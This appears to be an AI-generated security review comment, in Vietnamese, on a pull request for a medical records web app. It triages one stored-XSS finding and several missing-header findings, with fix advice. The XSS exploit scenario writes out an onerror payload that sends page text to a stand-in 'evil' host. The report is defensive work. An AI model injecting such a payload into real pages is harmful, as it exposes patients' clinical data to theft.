<!-- secagent-report -->
## 🛡️ AI Security Agent

**Kết quả:** 10 lỗi thật (TP) · 0 cần người xem (NEEDS_REVIEW) · 0 báo nhầm (FP) · trong đó 0 phát hiện mới do Agent tự tìm · commit `b6844e9`

| | Mức | Nguồn | Phát hiện | Vị trí | Độ tin cậy |
|---|---|---|---|---|---|
| 🔴 TP | HIGH | semgrep | security.semgrep.medicare.jinja-safe-filter (semgrep) | `app/medicare/templates/record/detail.html:29` | 0.95 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /login:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/confirm:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients/{patient_id}/edit:0` | 0.70 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /:0` | 0.70 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /health:0` | 0.65 |
| 🔴 TP | LOW | zap | 10038 (zap) | `dast:GET /login:0` | 0.70 |

### Chi tiết

#### 🔴 TP · HIGH · security.semgrep.medicare.jinja-safe-filter (semgrep) — `app/medicare/templates/record/detail.html:29`

CWE-79 · OWASP A05 · vi phạm R-01 · độ tin cậy 0.95 · nguồn: semgrep

**Phân tích:** `note.body | safe` render HTML do bác sĩ gửi lên mà không sanitize. `add_note` trong service.py chỉ strip và kiểm tra độ dài, không lọc HTML. Bác sĩ phụ trách (hoặc kẻ chiếm tài khoản bác sĩ) có thể POST trực tiếp `<script>` hoặc `<img onerror>`, không cần qua editor. Script chạy trong trình duyệt của bệnh nhân, y tá và bác sĩ cùng khoa khi họ xem bệnh án. Ứng dụng không có CSP nên không có lớp phòng thủ nào khác.

**Kịch bản khai thác:** Gửi POST /records/{id}/notes với body=`<img src=x onerror=fetch('//evil/?c='+document.body.innerText>`. Khi bệnh nhân hoặc y tá mở trang bệnh án, script chạy và đánh cắp dữ liệu lâm sàng hoặc thực hiện hành động thay họ.

**Đề xuất sửa:** Bỏ `| safe` trong templates/record/detail.html. Ưu tiên lưu văn bản thuần và để Jinja tự escape. Nếu cần định dạng, sanitize ở phía server trong `record/service.py::add_note` bằng allowlist thẻ (b, i, u, ul, li, p, br), không cho thuộc tính, rồi mới lưu và render. Không tin việc lọc ở rich-note.js. Thêm header CSP.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** main.py chỉ thêm các middleware Session, CatchAllErrors và Metrics. Không có middleware nào đặt X-Frame-Options hay CSP frame-ancestors, nên ZAP báo đúng. Lỗi này nằm ở cấu hình chung của app, không do PR này gây ra.

**Đề xuất sửa:** Thêm middleware security headers trong app/medicare/main.py, đặt `X-Frame-Options: DENY` hoặc CSP `frame-ancestors 'none'` cho mọi response.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /login:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Cùng nguyên nhân với F2: không có header chống clickjacking ở bất kỳ route nào, kể cả /login.

**Đề xuất sửa:** Dùng middleware security headers chung trong main.py, đặt X-Frame-Options DENY và CSP frame-ancestors.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP ở bất kỳ response nào. Thiếu CSP làm trầm trọng thêm lỗi XSS ở F1.

**Đề xuất sửa:** Thêm header Content-Security-Policy chặt (default-src 'self', không cho inline script) qua middleware trong main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/confirm:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP trên toàn app, cùng nguyên nhân với F7.

**Đề xuất sửa:** Thêm CSP qua middleware chung trong main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP trên toàn app, cùng nguyên nhân với F7.

**Đề xuất sửa:** Thêm CSP qua middleware chung trong main.py.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients/{patient_id}/edit:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP trên toàn app, cùng nguyên nhân với F7.

**Đề xuất sửa:** Thêm CSP qua middleware chung trong main.py.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên toàn app, không có middleware nào đặt header này.

**Đề xuất sửa:** Thêm `X-Content-Type-Options: nosniff` qua middleware chung trong main.py.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /health:0`

CWE-693 · OWASP A02 · độ tin cậy 0.65 · nguồn: zap

**Phân tích:** Thiếu X-Content-Type-Options trên toàn app, kể cả /health. Mức ảnh hưởng thấp vì endpoint này trả JSON.

**Đề xuất sửa:** Thêm `X-Content-Type-Options: nosniff` qua middleware chung trong main.py.

#### 🔴 TP · LOW · 10038 (zap) — `dast:GET /login:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Ứng dụng không đặt X-Content-Type-Options ở đâu (search trong repo không thấy "nosniff"). ZAP báo đúng.

Gộp các phát hiện: `zap:10021:dast:GET /login:0`, `zap:10038:dast:GET /login:0`

**Đề xuất sửa:** Trong middleware security headers ở main.py, thêm `X-Content-Type-Options: nosniff`.

---
<sub>LLM `claude-mcp` · model `claude-sonnet-5-5` · chiến lược `agent` · 36.8 s · 15 lần gọi LLM · 14 lần gọi công cụ · 93293 token vào / 4823 token ra · ≈ $0.0816 · chạm giới hạn: không</sub>
